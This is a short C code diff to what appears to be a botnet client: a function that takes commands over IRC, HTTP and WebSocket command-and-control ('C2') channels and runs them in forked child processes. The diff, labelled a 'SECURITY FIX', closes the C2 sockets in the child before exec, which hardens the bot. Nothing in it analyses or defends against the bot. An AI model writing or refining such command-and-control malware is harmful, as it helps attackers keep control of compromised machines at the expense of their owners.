@@ -1002,6 +1002,12 @@ int protocol_process_commands(notnet_bot_t *bot) {
 
             if (pid == 0) {
                 /* Child: close read end, redirect stdout to pipe, exec */
+                /* SECURITY FIX (#30): Close C2 sockets in child before exec
+                 * to prevent the child process from inheriting sensitive
+                 * file descriptors (IRC/HTTP/WS sockets). */
+                if (bot->c2_irc.sock >= 0) close(bot->c2_irc.sock);
+                if (bot->c2_http.sock >= 0) close(bot->c2_http.sock);
+                if (bot->c2_ws.sock >= 0) close(bot->c2_ws.sock);
                 close(pipefd[0]);
                 dup2(pipefd[1], STDOUT_FILENO);
                 /* Also redirect stderr to stdout to capture all output */
